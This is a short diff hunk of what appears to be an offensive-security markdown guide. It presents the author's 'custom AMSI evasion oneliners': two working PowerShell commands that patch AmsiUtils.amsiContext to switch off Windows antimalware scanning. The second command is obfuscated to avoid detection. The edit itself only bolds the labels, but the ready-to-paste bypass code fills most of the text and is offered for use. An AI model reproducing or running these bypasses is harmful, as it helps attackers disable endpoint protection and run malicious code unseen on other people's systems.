@@ -80,12 +80,12 @@ amsiInitFailed
 ```
 
    - OH, by the way - you can grab **my custom AMSI evasion oneliners** below - perfect for a one-shot use cases:
-      * Technique 1A: Overwrite `AmsiUtils.amsiContext`'s object (`_HAMSICONTEXT.Signature`) byte. Length: 146 bytes.
+      * **Technique 1A**: Overwrite `AmsiUtils.amsiContext`'s object (`_HAMSICONTEXT.Signature`) byte. Length: 146 bytes.
       ```
       [Runtime.InteropServices.Marshal]::WriteByte((([Ref].Assembly.GetTypes()|?{$_-clike'*Am*ls'}).GetFields(40)|?{$_-clike'*xt'}).GetValue($null),0x5)
       ```
 
-      * Technique 1B: Same as 1A, but obfuscated variant. (256 bytes)
+      * **Technique 1B**: Same as 1A, but obfuscated variant. (256 bytes)
       ```
       $h=[TyPE]('{5}{2}{4}{0}{3}{1}'-f'er','L','Un','viCes.maRShA','TIME.INTErOPS','r');Sv('W'+'e') ([tYpe]('{1}{0}'-f'EF','r'));(gET-vAriABLE h).vAlue::WriteByte((($wE.Assembly.GetTypes()|?{$_-clike'*Am*ls'}).GetFields(40)|?{$_-clike'*xt'}).GetValue($null),0x5)
       ```
